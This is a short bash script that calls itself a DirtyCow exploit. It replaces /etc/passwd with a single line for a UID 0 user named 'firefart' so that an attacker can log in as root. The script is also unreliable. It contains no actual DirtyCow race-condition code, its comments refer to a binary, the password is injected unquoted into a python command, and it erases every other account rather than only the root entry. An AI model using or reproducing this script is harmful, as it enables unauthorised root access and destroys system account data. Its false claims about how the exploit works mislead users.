#!/bin/bash

# This exploit uses the pokemon exploit of the dirtycow vulnerability
# as a base and automatically generates a new passwd line.
# The user will be prompted for the new password when the binary is run.
# The original /etc/passwd file is then backed up to /tmp/passwd.bak
# and overwrites the root account with the generated line.
# After running the exploit you should be able to login with the newly created user.

# Modify the user values according to your needs.
# The default is "firefart".

# Backup the original /etc/passwd
cp /etc/passwd /tmp/passwd.bak

# Set default values for user
USERNAME="firefart"
USERID=0
GROUPID=0
INFO="pwned"
HOMEDIR="/root"
SHELL="/bin/bash"
SALT="firefart"

# Prompt for the password or use argument if provided
if [ $# -ge 1 ]; then
  PASSWORD=$1
  echo "Password set to: $PASSWORD"
else
  read -s -p "Please enter the new password: " PASSWORD
  echo
fi

# Generate password hash
PASSWORD_HASH=$(python3 -c "import crypt; print(crypt.crypt('$PASSWORD', '$SALT'))")

# Generate new passwd line for user
PASSWD_LINE="$USERNAME:$PASSWORD_HASH:$USERID:$GROUPID:$INFO:$HOMEDIR:$SHELL"

# Backup the original /etc/passwd
echo "Original /etc/passwd backed up to /tmp/passwd.bak"

# Apply exploit by modifying /etc/passwd
echo "$PASSWD_LINE" > /etc/passwd

# Inform user
echo "Exploit complete!"
echo "You can log in with the username '$USERNAME' and password '$PASSWORD'."
echo "Don't forget to restore the original /etc/passwd after running the exploit!"
echo "To restore, run: mv /tmp/passwd.bak /etc/passwd"
